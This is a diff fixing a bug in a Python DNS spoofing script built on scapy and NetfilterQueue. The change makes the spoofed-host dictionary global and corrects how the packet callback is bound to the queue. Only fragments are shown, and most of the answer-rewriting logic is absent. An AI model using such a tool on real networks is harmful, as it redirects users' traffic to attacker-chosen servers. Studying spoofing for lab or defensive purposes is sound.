@@ -2,8 +2,10 @@ from scapy.all import *
 from netfilterqueue import NetfilterQueue
 import os
 
+dns_hosts = {}
 
-def process_packet(packet, dns_hosts):
+
+def process_packet(packet):
     # convert netfilter queue packet to scapy packet
     scapy_packet = IP(packet.get_payload())
     if scapy_packet.haslayer(DNSRR):
@@ -22,7 +24,7 @@ def process_packet(packet, dns_hosts):
     packet.accept()
 
 
-def modify_packet(packet, dns_hosts):
+def modify_packet(packet):
     # get the DNS question name, the domain name
     qname = packet[DNSQR].qname
     if qname not in dns_hosts:
@@ -49,8 +51,6 @@ if __name__ == "__main__":
     # ask the user where server is located
     web_server = input("Enter the IP address of the server: ")
 
-    dns_hosts = {}
-
     # ask the user which hosts he wants to spoof
     isDone = False
     while not isDone:
@@ -69,7 +69,7 @@ if __name__ == "__main__":
     try:
         # bind the queue number to our callback `process_packet`
         # and start it
-        queue.bind(QUEUE_NUM, process_packet(dns_hosts))
+        queue.bind(QUEUE_NUM, process_packet)
         queue.run()
     except KeyboardInterrupt:
         # if want to exit, make sure we
